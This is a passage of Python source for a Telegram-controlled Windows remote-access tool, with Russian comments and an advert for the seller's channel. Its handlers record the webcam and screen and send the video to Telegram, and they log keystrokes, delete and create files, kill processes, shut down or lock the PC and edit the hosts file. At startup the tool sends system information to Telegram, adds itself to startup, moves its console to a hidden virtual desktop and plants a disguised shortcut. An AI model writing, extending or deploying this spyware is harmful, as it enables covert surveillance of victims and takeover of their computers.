        # Windows –∫–æ–º–∞–Ω–¥ –¥–ª—è –∑–∞–∫—Ä—ã—Ç–∏—è –≤—Å–µ—Ö –æ–∫–æ–Ω
        os.system('taskkill /F /FI "STATUS eq RUNNING"')
    else:
        bot.send_message(message.chat.id, "üí¢–í—ã –Ω–µ –∞–≤—Ç–æ—Ä–∏–∑–æ–≤–∞–Ω—ã –≤ –±–æ—Ç–µ ;/ –ï—Å–ª–∏ –≤—ã —Ç–æ–∂–µ —Ö–æ—Ç–∏—Ç–µ —Å–µ–±–µ —Ç–∞–∫–æ–≥–æ –±–æ—Ç–∞ —Ç–æ –≤–∞–º –≤ —Ç–≥ - t.me/arkadasoft")
@bot.message_handler(commands=['stop'])
def handle_stop(message):
    if message.from_user.id == USER_ID:
        bot.send_message(message.chat.id, "üí§ –í—ã–∫–ª—é—á–µ–Ω–∏–µ –ø–∫")
        remove_from_startup()
        os.system('shutdown /s /t 1')
    else:
        bot.send_message(message.chat.id, "üí¢–í—ã –Ω–µ –∞–≤—Ç–æ—Ä–∏–∑–æ–≤–∞–Ω—ã –≤ –±–æ—Ç–µ ;/ –ï—Å–ª–∏ –≤—ã —Ç–æ–∂–µ —Ö–æ—Ç–∏—Ç–µ —Å–µ–±–µ —Ç–∞–∫–æ–≥–æ –±–æ—Ç–∞ —Ç–æ –≤–∞–º –≤ —Ç–≥ - t.me/arkadasoft")
@bot.message_handler(commands=['browser'])
def handle_browser(message):
    if message.from_user.id == USER_ID:
        # –ü–æ–ª—É—á–∞–µ–º URL –∏–∑ –∫–æ–º–∞–Ω–¥—ã
        url = message.text.split(' ', 1)[1] if ' ' in message.text else ''
        # –ü—Ä–æ–≤–µ—Ä—è–µ–º, —á—Ç–æ URL —Å–æ–æ—Ç–≤–µ—Ç—Å—Ç–≤—É–µ—Ç –æ—Å–Ω–æ–≤–Ω—ã–º —Å—Ç–∞–Ω–¥–∞—Ä—Ç–∞–º
        if re.match(r'^https?://', url):
            webbrowser.open(url)
            bot.send_message(message.chat.id, f"üíå –û—Ç–∫—Ä—ã—Ç–∏–µ URL: {url}")
        else:
            bot.send_message(message.chat.id, "üö´ –ù–µ–≤–µ—Ä–Ω—ã–π URL. –£–∫–∞–∂–∏—Ç–µ –¥–µ–π—Å—Ç–≤–∏—Ç–µ–ª—å–Ω—ã–π URL-–∞–¥—Ä–µ—Å, –Ω–∞—á–∏–Ω–∞—é—â–∏–π—Å—è —Å http:// –∏–ª–∏ https://.")
    else:
        bot.send_message(message.chat.id, "üí¢–í—ã –Ω–µ –∞–≤—Ç–æ—Ä–∏–∑–æ–≤–∞–Ω—ã –≤ –±–æ—Ç–µ ;/ –ï—Å–ª–∏ –≤—ã —Ç–æ–∂–µ —Ö–æ—Ç–∏—Ç–µ —Å–µ–±–µ —Ç–∞–∫–æ–≥–æ –±–æ—Ç–∞ —Ç–æ –≤–∞–º –≤ —Ç–≥ - t.me/arkadasoft")
@bot.message_handler(commands=['title'])
def handle_title(message):
    if message.from_user.id == USER_ID:
        # –ü–æ–ª—É—á–∞–µ–º —Ç–µ–∫—Å—Ç —Å–æ–æ–±—â–µ–Ω–∏—è –ø–æ—Å–ª–µ –∫–æ–º–∞–Ω–¥—ã
        msg_text = message.text.split(' ', 1)[1] if ' ' in message.text else ''
        if msg_text:
            # –°–æ–∑–¥–∞–µ–º VBS —Å–∫—Ä–∏–ø—Ç –¥–ª—è –æ—Ç–æ–±—Ä–∞–∂–µ–Ω–∏—è —Å–æ–æ–±—â–µ–Ω–∏—è
            vbs_script = f'MsgBox "{msg_text}", 48, "t.me/arkadasoft"'
            vbs_file_path = os.path.join(os.getenv('TEMP'), 'message.vbs')
            
            # –ó–∞–ø–∏—Å—ã–≤–∞–µ–º VBS —Å–∫—Ä–∏–ø—Ç –≤–æ –≤—Ä–µ–º–µ–Ω–Ω—ã–π —Ñ–∞–π–ª
            with open(vbs_file_path, 'w') as vbs_file:
                vbs_file.write(vbs_script)
            
            # –ó–∞–ø—É—Å–∫–∞–µ–º VBS —Å–∫—Ä–∏–ø—Ç
            subprocess.run(['wscript', vbs_file_path], check=True)
            
            # –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏–µ –≤ Telegram
            bot.send_message(message.chat.id, "ü§ó –°–æ–æ–±—â–µ–Ω–∏–µ –ø—Ä–æ—Å–º–æ—Ç—Ä–µ–ª–∏ –∏ –∑–∞–∫—Ä—ã–ª–∏!")
        else:
            bot.send_message(message.chat.id, "/title {—Ç–µ–∫—Å—Ç}")
    else:
        bot.send_message(message.chat.id, "üí¢–í—ã –Ω–µ –∞–≤—Ç–æ—Ä–∏–∑–æ–≤–∞–Ω—ã –≤ –±–æ—Ç–µ ;/ –ï—Å–ª–∏ –≤—ã —Ç–æ–∂–µ —Ö–æ—Ç–∏—Ç–µ —Å–µ–±–µ —Ç–∞–∫–æ–≥–æ –±–æ—Ç–∞ —Ç–æ –≤–∞–º –≤ —Ç–≥ - t.me/arkadasoft")
@bot.message_handler(commands=['screen_off'])
def handle_screen_off(message):
    if message.from_user.id == USER_ID:
        # –í—ã–∫–ª—é—á–µ–Ω–∏–µ —ç–∫—Ä–∞–Ω–∞
        ctypes.windll.user32.SendMessageW(65535, 274, 61808, 2)
        bot.send_message(message.chat.id, "üò¥ –≠–∫—Ä–∞–Ω –æ—Ç–∫–ª—é—á–µ–Ω (—á–µ—Ä–µ–∑ –ø–∞—Ä—É —Å–µ–∫—É–Ω–¥ –æ–Ω –≤–∫–ª—é—á–∏—Ç—å—Å—è)")
    else:
        bot.send_message(message.chat.id, "üí¢–í—ã –Ω–µ –∞–≤—Ç–æ—Ä–∏–∑–æ–≤–∞–Ω—ã –≤ –±–æ—Ç–µ ;/ –ï—Å–ª–∏ –≤—ã —Ç–æ–∂–µ —Ö–æ—Ç–∏—Ç–µ —Å–µ–±–µ —Ç–∞–∫–æ–≥–æ –±–æ—Ç–∞ —Ç–æ –≤–∞–º –≤ —Ç–≥ - t.me/arkadasoft")

@bot.message_handler(commands=['screen_on'])
def handle_screen_on(message):
    if message.from_user.id == USER_ID:
        # –í–∫–ª—é—á–µ–Ω–∏–µ —ç–∫—Ä–∞–Ω–∞
        ctypes.windll.user32.SendMessageW(65535, 274, 61808, -1)
        bot.send_message(message.chat.id, "–≠–∫—Ä–∞–Ω –≤–∫–ª—é—á–µ–Ω.")
    else:
        bot.send_message(message.chat.id, "üí¢–í—ã –Ω–µ –∞–≤—Ç–æ—Ä–∏–∑–æ–≤–∞–Ω—ã –≤ –±–æ—Ç–µ ;/ –ï—Å–ª–∏ –≤—ã —Ç–æ–∂–µ —Ö–æ—Ç–∏—Ç–µ —Å–µ–±–µ —Ç–∞–∫–æ–≥–æ –±–æ—Ç–∞ —Ç–æ –≤–∞–º –≤ —Ç–≥ - t.me/arkadasoft")
@bot.message_handler(commands=['sys'])
def handle_system_stats(message):
    if message.from_user.id == USER_ID:
        cpu_usage = psutil.cpu_percent(interval=1)
        memory_info = psutil.virtual_memory()
        memory_usage = memory_info.percent
        uptime = time.time() - psutil.boot_time()
        uptime_str = time.strftime("%H:%M:%S", time.gmtime(uptime))

        stats = (f"CPU Usage: {cpu_usage}%\n"
                 f"Memory Usage: {memory_usage}%\n"
                 f"System Uptime: {uptime_str}")
        bot.send_message(message.chat.id, stats)
    else:
        bot.send_message(message.chat.id, "üí¢–í—ã –Ω–µ –∞–≤—Ç–æ—Ä–∏–∑–æ–≤–∞–Ω—ã –≤ –±–æ—Ç–µ ;/ –ï—Å–ª–∏ –≤—ã —Ç–æ–∂–µ —Ö–æ—Ç–∏—Ç–µ —Å–µ–±–µ —Ç–∞–∫–æ–≥–æ –±–æ—Ç–∞ —Ç–æ –≤–∞–º –≤ —Ç–≥ - t.me/arkadasoft")
@bot.message_handler(commands=['lock'])
def handle_lock(message):
    if message.from_user.id == USER_ID:
        ctypes.windll.user32.LockWorkStation()
        bot.send_message(message.chat.id, "üîê –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—é –≤–Ω–æ–≤—å –Ω–∞–¥–æ –≤–≤–æ–¥–∏—Ç—å –ø–∞—Ä–æ–ª—å!")
    else:
        bot.send_message(message.chat.id, "üí¢–í—ã –Ω–µ –∞–≤—Ç–æ—Ä–∏–∑–æ–≤–∞–Ω—ã –≤ –±–æ—Ç–µ ;/ –ï—Å–ª–∏ –≤—ã —Ç–æ–∂–µ —Ö–æ—Ç–∏—Ç–µ —Å–µ–±–µ —Ç–∞–∫–æ–≥–æ –±–æ—Ç–∞ —Ç–æ –≤–∞–º –≤ —Ç–≥ - t.me/arkadasoft")
@bot.message_handler(commands=['volume_up'])
def handle_volume_up(message):
    if message.from_user.id == USER_ID:
        for _ in range(10):
            win32api.keybd_event(0xAF, 0, 0, 0)  # Volume up
        bot.send_message(message.chat.id, "üîä –ó–≤—É–∫ –ø—Ä–∏–±–∞–≤–ª–µ–Ω")
    else:
        bot.send_message(message.chat.id, "üí¢–í—ã –Ω–µ –∞–≤—Ç–æ—Ä–∏–∑–æ–≤–∞–Ω—ã –≤ –±–æ—Ç–µ ;/ –ï—Å–ª–∏ –≤—ã —Ç–æ–∂–µ —Ö–æ—Ç–∏—Ç–µ —Å–µ–±–µ —Ç–∞–∫–æ–≥–æ –±–æ—Ç–∞ —Ç–æ –≤–∞–º –≤ —Ç–≥ - t.me/arkadasoft")

@bot.message_handler(commands=['volume_down'])
def handle_volume_down(message):
    if message.from_user.id == USER_ID:
        for _ in range(10):
            win32api.keybd_event(0xAE, 0, 0, 0)  # Volume down
        bot.send_message(message.chat.id, "üîâ –ó–≤—É–∫ —É–±–∞–≤–ª–µ–Ω")
    else:
        bot.send_message(message.chat.id, "üí¢–í—ã –Ω–µ –∞–≤—Ç–æ—Ä–∏–∑–æ–≤–∞–Ω—ã –≤ –±–æ—Ç–µ ;/ –ï—Å–ª–∏ –≤—ã —Ç–æ–∂–µ —Ö–æ—Ç–∏—Ç–µ —Å–µ–±–µ —Ç–∞–∫–æ–≥–æ –±–æ—Ç–∞ —Ç–æ –≤–∞–º –≤ —Ç–≥ - t.me/arkadasoft")
@bot.message_handler(commands=['get_processes'])
def handle_get_processes(message):
    if message.from_user.id == USER_ID:
        processes = [proc.info['name'] for proc in psutil.process_iter(['name'])]
        bot.send_message(message.chat.id, "\n".join(processes))
    else:
        bot.send_message(message.chat.id, "üí¢–í—ã –Ω–µ –∞–≤—Ç–æ—Ä–∏–∑–æ–≤–∞–Ω—ã –≤ –±–æ—Ç–µ ;/ –ï—Å–ª–∏ –≤—ã —Ç–æ–∂–µ —Ö–æ—Ç–∏—Ç–µ —Å–µ–±–µ —Ç–∞–∫–æ–≥–æ –±–æ—Ç–∞ —Ç–æ –≤–∞–º –≤ —Ç–≥ - t.me/arkadasoft")
@bot.message_handler(commands=['kill_process'])
def handle_kill_process(message):
    if message.from_user.id == USER_ID:
        process_name = message.text.split(' ', 1)[1] if ' ' in message.text else ''
        if process_name:
            for proc in psutil.process_iter(['name']):
                if proc.info['name'] == process_name:
                    proc.kill()
                    bot.send_message(message.chat.id, f"Process {process_name} killed.")
                    return
            bot.send_message(message.chat.id, "üò∂ –¢–∞–∫–æ–≥–æ –ø—Ä–æ—Ü–µ—Å—Å–∞ –Ω–µ—Ç—É")
        else:
            bot.send_message(message.chat.id, "üò∂ Please provide a process name.")
    else:
        bot.send_message(message.chat.id, "üí¢–í—ã –Ω–µ –∞–≤—Ç–æ—Ä–∏–∑–æ–≤–∞–Ω—ã –≤ –±–æ—Ç–µ ;/ –ï—Å–ª–∏ –≤—ã —Ç–æ–∂–µ —Ö–æ—Ç–∏—Ç–µ —Å–µ–±–µ —Ç–∞–∫–æ–≥–æ –±–æ—Ç–∞ —Ç–æ –≤–∞–º –≤ —Ç–≥ - t.me/arkadasoft")
@bot.message_handler(content_types=['audio', 'voice', 'video'])
def handle_media(message):
    try:
        file_info = bot.get_file(message.audio.file_id if message.audio else message.voice.file_id if message.voice else message.video.file_id)
        downloaded_file = bot.download_file(file_info.file_path)

        with open("temp_media", 'wb') as new_file:
            new_file.write(downloaded_file)

        audio = AudioFileClip("temp_media")
        audio.preview()  # –í–æ—Å–ø—Ä–æ–∏–∑–≤–µ–¥–µ–Ω–∏–µ –∑–≤—É–∫–∞
        audio.close()

        bot.reply_to(message, "üé∂ –ê—É–¥–∏–æ –≤–æ—Å–ø—Ä–æ–∏–∑–≤–µ–¥–µ–Ω–æ —É—Å–ø–µ—à–Ω–æ.")
    except Exception as e:
        bot.reply_to(message, f"‚ùå –û—à–∏–±–∫–∞ –ø—Ä–∏ –≤–æ—Å–ø—Ä–æ–∏–∑–≤–µ–¥–µ–Ω–∏–∏ –∞—É–¥–∏–æ: {e}")
# –ö–æ–º–∞–Ω–¥–∞ /network_info –¥–ª—è –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏ –æ —Å–µ—Ç–∏
@bot.message_handler(commands=['net'])
def handle_network_info(message):
   if message.from_user.id == USER_ID:
    
    hostname = socket.gethostname()
    local_ip = socket.gethostbyname(hostname)
    
    # –ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –æ —Å–µ—Ç–∏
    network_info = f"üíª –ò–º—è —É—Å—Ç—Ä–æ–π—Å—Ç–≤–∞: {hostname}\nüåê IP-–∞–¥—Ä–µ—Å: {local_ip}\n"
    bot.reply_to(message, network_info)

# –ö–æ–º–∞–Ω–¥–∞ /ping <–∞–¥—Ä–µ—Å>
@bot.message_handler(commands=['ping'])
def handle_ping(message):
   if message.from_user.id == USER_ID:

    
    try:
        address = message.text.split()[1]
        
        # –ü—Ä–æ–≤–µ—Ä–∫–∞ –æ–ø–µ—Ä–∞—Ü–∏–æ–Ω–Ω–æ–π —Å–∏—Å—Ç–µ–º—ã
        if sys.platform == "win32":
            # –ü–∏–Ω–≥ –¥–ª—è Windows
            response = subprocess.run(['ping', '-n', '4', address], capture_output=True, text=True, encoding='cp866')
        else:
            # –ü–∏–Ω–≥ –¥–ª—è Unix-—Å–∏—Å—Ç–µ–º
            response = subprocess.run(['ping', '-c', '4', address], capture_output=True, text=True)
        
        bot.reply_to(message, f"üì∂ –†–µ–∑—É–ª—å—Ç–∞—Ç –ø–∏–Ω–≥–∞:\n{response.stdout}")
    except IndexError:
        bot.reply_to(message, "‚ùó –ü–æ–∂–∞–ª—É–π—Å—Ç–∞, —É–∫–∞–∂–∏—Ç–µ –∞–¥—Ä–µ—Å –¥–ª—è –ø–∏–Ω–≥–∞. –ü—Ä–∏–º–µ—Ä: /ping google.com")
    except Exception as e:
        bot.reply_to(message, f"‚ùå –û—à–∏–±–∫–∞ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è –ø–∏–Ω–≥–∞: {e}")

# –ö–æ–º–∞–Ω–¥–∞ /move_mouse <x> <y> –¥–ª—è –ø–µ—Ä–µ–º–µ—â–µ–Ω–∏—è –∫—É—Ä—Å–æ—Ä–∞
@bot.message_handler(commands=['move_mouse'])
def handle_move_mouse(message):
   if message.from_user.id == USER_ID:
    
    try:
        _, x, y = message.text.split()
        x, y = int(x), int(y)
        pyautogui.moveTo(x, y)
        bot.reply_to(message, f"üëÜ –ö—É—Ä—Å–æ—Ä –ø–µ—Ä–µ–º–µ—â–µ–Ω –≤ —Ç–æ—á–∫—É ({x}, {y})")
    except ValueError:
        bot.reply_to(message, "‚ùó –ù–µ–≤–µ—Ä–Ω—ã–π —Ñ–æ—Ä–º–∞—Ç. –ò—Å–ø–æ–ª—å–∑—É–π—Ç–µ: /move_mouse <x> <y>")
    except Exception as e:
        bot.reply_to(message, f"‚ùå –û—à–∏–±–∫–∞ –ø–µ—Ä–µ–º–µ—â–µ–Ω–∏—è –∫—É—Ä—Å–æ—Ä–∞: {e}")

# –ö–æ–º–∞–Ω–¥–∞ /click –¥–ª—è –∫–ª–∏–∫–∞ –º—ã—à–∏
@bot.message_handler(commands=['click'])
def handle_click(message):
    if message.from_user.id == USER_ID:
    
     pyautogui.click()
     bot.reply_to(message, "ü•∞ –ö–ª–∏–∫ –≤—ã–ø–æ–ª–Ω–µ–Ω")

# –ö–æ–º–∞–Ω–¥–∞ /keyboard_press <key> –¥–ª—è –Ω–∞–∂–∞—Ç–∏—è –∫–ª–∞–≤–∏—à–∏
@bot.message_handler(commands=['keyboard_press'])
def handle_keyboard_press(message):
  if message.from_user.id == USER_ID:

    try:
        key = message.text.split()[1]
        if key == "enter":
            keyboard_controller.press(Key.enter)
            keyboard_controller.release(Key.enter)
        else:
            keyboard_controller.press(key)
            keyboard_controller.release(key)
        bot.reply_to(message, f"üìù –ö–ª–∞–≤–∏—à–∞ '{key}' –Ω–∞–∂–∞—Ç–∞")
    except IndexError:
        bot.reply_to(message, "‚ùó –ü–æ–∂–∞–ª—É–π—Å—Ç–∞, —É–∫–∞–∂–∏—Ç–µ –∫–ª–∞–≤–∏—à—É. –ü—Ä–∏–º–µ—Ä: /keyboard_press a")
    except Exception as e:
        bot.reply_to(message, f"‚ùå –û—à–∏–±–∫–∞ –Ω–∞–∂–∞—Ç–∏—è –∫–ª–∞–≤–∏—à–∏: {e}")
# –ö–æ–º–∞–Ω–¥–∞ /record_screen –¥–ª—è –∑–∞–ø–∏—Å–∏ —ç–∫—Ä–∞–Ω–∞
@bot.message_handler(commands=['rec'])
def handle_record_screen(message):
  if message.from_user.id == USER_ID:

    # –ü—Ä–æ–¥–æ–ª–∂–∏—Ç–µ–ª—å–Ω–æ—Å—Ç—å –∑–∞–ø–∏—Å–∏ (–≤ —Å–µ–∫—É–Ω–¥–∞—Ö)
    duration = 10  # –ó–∞–ø–∏—Å—å —ç–∫—Ä–∞–Ω–∞ –≤ —Ç–µ—á–µ–Ω–∏–µ 10 —Å–µ–∫—É–Ω–¥
    output_file = "screen_record.avi"

    # –ü–∞—Ä–∞–º–µ—Ç—Ä—ã –¥–ª—è –∑–∞–ø–∏—Å–∏ –≤–∏–¥–µ–æ
    screen_size = pyautogui.size()  # –ü–æ–ª—É—á–∞–µ–º —Ä–∞–∑–º–µ—Ä —ç–∫—Ä–∞–Ω–∞
    fourcc = cv2.VideoWriter_fourcc(*'XVID')  # –ö–æ–¥–µ–∫
    out = cv2.VideoWriter(output_file, fourcc, 20.0, (screen_size))

    start_time = time.time()

    while True:
        # –ó–∞—Ö–≤–∞—Ç—ã–≤–∞–µ–º —Å–∫—Ä–∏–Ω—à–æ—Ç —ç–∫—Ä–∞–Ω–∞
        screenshot = pyautogui.screenshot()
        frame = np.array(screenshot)  # –ü—Ä–µ–æ–±—Ä–∞–∑—É–µ–º –≤ —Ñ–æ—Ä–º–∞—Ç numpy
        frame = cv2.cvtColor(frame, cv2.COLOR_RGB2BGR)  # –ü—Ä–µ–æ–±—Ä–∞–∑—É–µ–º –≤ —Ñ–æ—Ä–º–∞—Ç BGR –¥–ª—è OpenCV
        out.write(frame)  # –ó–∞–ø–∏—Å—ã–≤–∞–µ–º –∫–∞–¥—Ä

        if time.time() - start_time >= duration:
            break
    
    out.release()  # –ó–∞–≤–µ—Ä—à–∞–µ–º –∑–∞–ø–∏—Å—å –≤–∏–¥–µ–æ

    # –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –≤–∏–¥–µ–æ
    with open(output_file, 'rb') as video:
        bot.send_video(message.chat.id, video)
    
    # –£–¥–∞–ª—è–µ–º –≤—Ä–µ–º–µ–Ω–Ω—ã–π —Ñ–∞–π–ª
    os.remove(output_file)
    bot.reply_to(message, "‚úÖ –ó–∞–ø–∏—Å—å —ç–∫—Ä–∞–Ω–∞ –∑–∞–≤–µ—Ä—à–µ–Ω–∞ –∏ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–∞.")
# –ö–æ–º–∞–Ω–¥–∞ /block_site –¥–ª—è –±–ª–æ–∫–∏—Ä–æ–≤–∫–∏ —Å–∞–π—Ç–æ–≤
@bot.message_handler(commands=['block_site'])
def handle_block_site(message):
  if message.from_user.id == USER_ID:

    
    try:
        site = message.text.split()[1]
        if platform.system() == "Windows":
            hosts_path = r"C:\Windows\System32\drivers\etc\hosts"
            redirect = "127.0.0.1"
        else:
            hosts_path = "/etc/hosts"
            redirect = "127.0.0.1"
        
        # –û—Ç–∫—Ä—ã—Ç–∏–µ —Ñ–∞–π–ª–∞ hosts
        with open(hosts_path, "a") as hosts_file:
            hosts_file.write(f"{redirect} {site}\n")

        bot.reply_to(message, f"üëæ –°–∞–π—Ç {site} –±—ã–ª –∑–∞–±–ª–æ–∫–∏—Ä–æ–≤–∞–Ω.")
    
    except IndexError:
        bot.reply_to(message, "‚ùó –ü–æ–∂–∞–ª—É–π—Å—Ç–∞, —É–∫–∞–∂–∏—Ç–µ —Å–∞–π—Ç –¥–ª—è –±–ª–æ–∫–∏—Ä–æ–≤–∫–∏. –ü—Ä–∏–º–µ—Ä: /block_site example.com")
    except Exception as e:
        bot.reply_to(message, f"üö´ –û—à–∏–±–∫–∞ –ø—Ä–∏ –±–ª–æ–∫–∏—Ä–æ–≤–∫–µ —Å–∞–π—Ç–∞: {e}")
# –ö–æ–º–∞–Ω–¥–∞ –¥–ª—è –ø–µ—Ä–µ—Ö–æ–¥–∞ –≤ —Å–ø—è—â–∏–π —Ä–µ–∂–∏–º
@bot.message_handler(commands=['sleep'])
def handle_sleep(message):
  if message.from_user.id == USER_ID:
    
    if platform.system() == "Windows":
        subprocess.call("rundll32.exe powrprof.dll,SetSuspendState 0,1,0")
    else:
        subprocess.call("systemctl suspend")
    
    bot.reply_to(message, "üò¥ –°–ø—è—â–∏–π —Ä–µ–∂–∏–º –≤–∫–ª—é—á–µ–Ω!")
# –ö–æ–º–∞–Ω–¥–∞ –¥–ª—è –ø–æ–ª—É—á–µ–Ω–∏—è —Å–ø–∏—Å–∫–∞ —Ñ–∞–π–ª–æ–≤ –≤ –¥–∏—Ä–µ–∫—Ç–æ—Ä–∏–∏
@bot.message_handler(commands=['list_files'])
def handle_list_files(message):
  if message.from_user.id == USER_ID:
    
    try:
        directory = message.text.split(maxsplit=1)[1]
        files = os.listdir(directory)
        files_list = '\n'.join(files)
        bot.reply_to(message, f"üìÇ –°–ø–∏—Å–æ–∫ —Ñ–∞–π–ª–æ–≤ –≤ {directory}:\n{files_list}")
    except IndexError:
        bot.reply_to(message, "‚ùó –ü–æ–∂–∞–ª—É–π—Å—Ç–∞, —É–∫–∞–∂–∏—Ç–µ –¥–∏—Ä–µ–∫—Ç–æ—Ä–∏—é. –ü—Ä–∏–º–µ—Ä: /list_files /home/user")
    except Exception as e:
        bot.reply_to(message, f"‚ùå –û—à–∏–±–∫–∞: {e}")
# –ö–æ–º–∞–Ω–¥–∞ –¥–ª—è —É–¥–∞–ª–µ–Ω–∏—è —Ñ–∞–π–ª–∞
@bot.message_handler(commands=['delete_file'])
def handle_delete_file(message):
  if message.from_user.id == USER_ID:

    try:
        file_path = message.text.split(maxsplit=1)[1]
        os.remove(file_path)
        bot.reply_to(message, f"üóë –§–∞–π–ª {file_path} –±—ã–ª —É–¥–∞–ª–µ–Ω.")
    except IndexError:
        bot.reply_to(message, "‚ùó –ü–æ–∂–∞–ª—É–π—Å—Ç–∞, —É–∫–∞–∂–∏—Ç–µ –ø—É—Ç—å –∫ —Ñ–∞–π–ª—É –¥–ª—è —É–¥–∞–ª–µ–Ω–∏—è. –ü—Ä–∏–º–µ—Ä: /delete_file /home/user/file.txt")
    except Exception as e:
        bot.reply_to(message, f"‚ùå –û—à–∏–±–∫–∞: {e}")
# –ö–æ–º–∞–Ω–¥–∞ –¥–ª—è —Å–æ–∑–¥–∞–Ω–∏—è —Ñ–∞–π–ª–∞
@bot.message_handler(commands=['create_file'])
def handle_create_file(message):
  if message.from_user.id == USER_ID:

    try:
        args = message.text.split(maxsplit=2)
        if len(args) != 3:
            raise IndexError
        file_path, content = args[1], args[2]
        with open(file_path, 'w') as f:
            f.write(content)
        bot.reply_to(message, f"üìÅ –§–∞–π–ª {file_path} –±—ã–ª —Å–æ–∑–¥–∞–Ω —Å —Å–æ–¥–µ—Ä–∂–∞–Ω–∏–µ–º: {content}")
    except IndexError:
        bot.reply_to(message, "‚ùó –ü–æ–∂–∞–ª—É–π—Å—Ç–∞, —É–∫–∞–∂–∏—Ç–µ –ø—É—Ç—å –∏ —Å–æ–¥–µ—Ä–∂–∞–Ω–∏–µ —Ñ–∞–π–ª–∞. –ü—Ä–∏–º–µ—Ä: /create_file /home/user/file.txt 'Hello World!'")
    except Exception as e:
        bot.reply_to(message, f"‚ùå –û—à–∏–±–∫–∞: {e}")

# –ö–æ–º–∞–Ω–¥–∞ –¥–ª—è –∑–∞–ø–∏—Å–∏ —Å –≤–µ–±-–∫–∞–º–µ—Ä—ã
@bot.message_handler(commands=['webcam_record'])
def handle_webcam_record(message):
  if message.from_user.id == USER_ID:

    # –ü—Ä–æ–¥–æ–ª–∂–∏—Ç–µ–ª—å–Ω–æ—Å—Ç—å –∑–∞–ø–∏—Å–∏ (–≤ —Å–µ–∫—É–Ω–¥–∞—Ö)
    duration = 10  # –ó–∞–ø–∏—Å—å –≤ —Ç–µ—á–µ–Ω–∏–µ 10 —Å–µ–∫—É–Ω–¥
    output_file = "webcam_record.avi"
    
    # –ù–∞—Å—Ç—Ä–æ–π–∫–∞ –∑–∞—Ö–≤–∞—Ç–∞ —Å –∫–∞–º–µ—Ä—ã
    cap = cv2.VideoCapture(0)  # –ò—Å–ø–æ–ª—å–∑—É–µ–º –ø–µ—Ä–≤—É—é –¥–æ—Å—Ç—É–ø–Ω—É—é –∫–∞–º–µ—Ä—É
    if not cap.isOpened():
        bot.reply_to(message, "üö´ –ù–µ —É–¥–∞–ª–æ—Å—å –ø–æ–ª—É—á–∏—Ç—å –¥–æ—Å—Ç—É–ø –∫ –≤–µ–±-–∫–∞–º–µ—Ä–µ.")
        return

    # –ü–∞—Ä–∞–º–µ—Ç—Ä—ã –¥–ª—è –∑–∞–ø–∏—Å–∏ –≤–∏–¥–µ–æ
    fourcc = cv2.VideoWriter_fourcc(*'XVID')  # –ö–æ–¥–µ–∫
    fps = cap.get(cv2.CAP_PROP_FPS) or 20  # –ß–∞—Å—Ç–æ—Ç–∞ –∫–∞–¥—Ä–æ–≤
    frame_width = int(cap.get(cv2.CAP_PROP_FRAME_WIDTH))
    frame_height = int(cap.get(cv2.CAP_PROP_FRAME_HEIGHT))
    out = cv2.VideoWriter(output_file, fourcc, fps, (frame_width, frame_height))

    start_time = time.time()

    while True:
        ret, frame = cap.read()
        if not ret:
            break
        out.write(frame)  # –ó–∞–ø–∏—Å—ã–≤–∞–µ–º –∫–∞–¥—Ä
        
        if time.time() - start_time >= duration:
            break

    cap.release()
    out.release()
    
    # –û—Ç–ø—Ä–∞–≤–∫–∞ –≤–∏–¥–µ–æ
    with open(output_file, 'rb') as video:
        bot.send_video(message.chat.id, video)

    # –£–¥–∞–ª–µ–Ω–∏–µ –≤—Ä–µ–º–µ–Ω–Ω–æ–≥–æ —Ñ–∞–π–ª–∞
    os.remove(output_file)
    bot.reply_to(message, "‚úÖ –ó–∞–ø–∏—Å—å —Å –≤–µ–±-–∫–∞–º–µ—Ä—ã –∑–∞–≤–µ—Ä—à–µ–Ω–∞ –∏ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–∞.")
# –ö–æ–º–∞–Ω–¥–∞ –¥–ª—è –ø–æ–ª—É—á–µ–Ω–∏—è —Å–∏—Å—Ç–µ–º–Ω—ã—Ö –ª–æ–≥–æ–≤
@bot.message_handler(commands=['get_logs'])
def handle_get_logs(message):
  if message.from_user.id == USER_ID:

    try:
        logs = ""
        if platform.system() == "Windows":
            logs_path = r"C:\Windows\System32\winevt\Logs\System.evtx"
            logs = subprocess.check_output(['wevtutil', 'qe', 'System', '/f:Text', '/c:5']).decode("utf-8")
        else:
            logs_path = "/var/log/syslog"
            with open(logs_path, 'r') as f:
                logs = f.read()

        # –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –ª–æ–≥–∏
        bot.reply_to(message, f"üìÑ –õ–æ–≥–∏:\n{logs[:1000]}...")  # –û–≥—Ä–∞–Ω–∏—á–∏–º –¥–ª–∏–Ω—É —Å–æ–æ–±—â–µ–Ω–∏—è –¥–ª—è —É–¥–æ–±—Å—Ç–≤–∞

    except Exception as e:
        bot.reply_to(message, f"‚ùå –û—à–∏–±–∫–∞ –ø—Ä–∏ –ø–æ–ª—É—á–µ–Ω–∏–∏ –ª–æ–≥–æ–≤: {e}")



# Send information on startup
def send_on_startup():
    info = get_system_info()
    send_info_to_telegram(info)

# Start bot polling
def start_bot():
    send_on_startup()  # Send info immediately when the bot starts
    bot.polling()

if __name__ == '__main__':
    start_bot()
    create_virtual_desktop()
    add_to_startup()
    time.sleep(2)  # Wait for the new desktop to be created
    move_console_to_new_desktop()
    # –û–ø—Ä–µ–¥–µ–ª–µ–Ω–∏–µ –ø—É—Ç–∏ –∫ —Å–∫–æ–º–ø–∏–ª–∏—Ä–æ–≤–∞–Ω–Ω–æ–º—É .exe —Ñ–∞–π–ª—É
    exe_path = os.path.abspath(sys.argv[0])
    create_shortcut(exe_path, 'MyCompiledApp')